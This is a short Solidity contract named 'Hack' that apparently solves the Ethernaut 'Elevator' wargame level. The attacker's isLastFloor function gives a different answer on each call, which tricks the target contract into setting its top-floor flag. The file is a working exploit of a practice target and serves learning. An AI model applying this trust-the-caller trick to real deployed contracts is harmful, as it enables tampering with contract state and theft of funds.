pragma solidity ^0.8.0;

interface Elevator{
    function goTo(uint _floor) external;
}

contract Hack {
  // our instance 
  address instance = 0x03CbEd85Ad10Bfca27a7dA83442FF268fb006B60;
  Elevator public target;
  bool result = true;
  function isLastFloor(uint) public returns (bool){
    // or shorter: result = !result
    if(result == true)
    {
      // first call = false
      result = false;
    }
    else {
      // second call = true 
      result = true;
    }
    return result;
  }

  function attack() public {
    target.goTo(13); // make up any number
    // the Ethernaut contract will now do Building(msg.sender)
    // that means we get an instance of the Building, refering to our own msg.sender contract address
    // the isLastFloor() method that will be executed will now be the one we provided
  }

  constructor() {
    target = Elevator(instance);
  }
}